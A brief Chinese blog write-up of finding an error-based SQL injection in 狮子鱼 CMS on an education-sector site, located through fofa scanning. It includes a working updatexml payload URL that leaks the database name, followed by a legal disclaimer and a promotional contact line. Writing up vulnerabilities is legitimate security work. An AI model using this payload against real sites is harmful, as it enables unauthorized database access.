# 原创
：  EDU实战-SQL注入漏洞

# EDU实战-SQL注入漏洞

```
对于edu来说，是新人挖洞较好的平台，本次记录一次走运的捡漏

```

0x01 前景<br/> 在进行fofa盲打站点的时候，来到了一个后台管理处看到集市二字，应该是edu站点<br/>  

<br/> 确认目标身份（使用的quake进行然后去ipc备案查询）<br/>  

<br/>  

<br/> 网站后台很像cms搭建的，在查看网站时发现

```
/seller.php?s=/Public/login

```

狮子鱼cms的特征<br/> 直接去百度一手，发现有个SQL注入还有其他的，打算一个一个尝试看看<br/>  

<br/> 0x02 尝试挖掘<br/> payload

```
https://www.xxx.com/index.php?s=api/goods_detail&amp;goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)

```

成功爆破出数据库名

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

点赞+在看支持一下吧~

你的点赞是我更新的动力,免费领取安全学习资料包！<br/>[+V【zkaq222】或者下面的扫码不然通不过哦，免费领取安全学习资料包！（私聊进群一起学习，共同进步）腾讯文档-在线文档<img alt="icon-default.png?t=N7T8" src="https://csdnimg.cn/release/blog_editor_html/release2.3.6/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N7T8"/>https://docs.qq.com/doc/DYmVETWlZemh0Ymdv](https://docs.qq.com/doc/DYmVETWlZemh0Ymdv)
